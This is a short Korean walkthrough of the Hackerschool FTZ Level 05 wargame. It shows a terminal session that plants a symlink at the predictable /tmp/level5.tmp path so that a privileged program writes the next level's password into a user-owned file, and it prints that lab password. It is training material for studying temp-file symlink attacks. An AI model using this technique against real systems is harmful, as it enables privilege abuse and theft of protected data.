# Hackerschool FTZ Level 05

```
login as: level5
level5@192.168.18.131's password:
[level5@ftz level5]$ ls
hint  public_html  tmp
[level5@ftz level5]$ cat hint

/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.


[level5@ftz level5]$ cd /tmp
[level5@ftz tmp]$ touch level5.to
[level5@ftz tmp]$ ln -s level5.to level5.tmp
[level5@ftz tmp]$ ls -al
total 24
drwxrwxrwt    2 root     root         4096 Apr 12 01:03 .
drwxr-xr-x   20 root     root         4096 Apr 11 21:48 ..
lrwxrwxrwx    1 level5   level5          9 Apr 12 01:03 level5.tmp -> level5.to
-rw-rw-r--    1 level5   level5          0 Apr 12 01:03 level5.to
srwxrwxrwx    1 mysql    mysql           0 Apr 11 21:49 mysql.sock
[level5@ftz tmp]$ /usr/bin/level5
[level5@ftz tmp]$ cat level5.to
next password : what the hell
[level5@ftz tmp]$
```

`/tmp` 디렉토리에 `level5.tmp` 파일을 임시로 사용한다고 한다.

`level5.tmp` 파일을 `level.to` 파일을 가리키도록 심볼릭 링크를 걸어둔다.

이제 `/usr/bin/level5` 프로그램을 실행하면 `level5.tmp` 파일에 내용을 쓰고 파일을 지울 것이다.

이 때 내용은 `level5.to` 에 써지고, 파일은 `level5.tmp` 링크 파일이 지워지게 된다.

그러므로 `level5.to` 파일을 읽으면 임시파일의 내용을 볼 수 있다.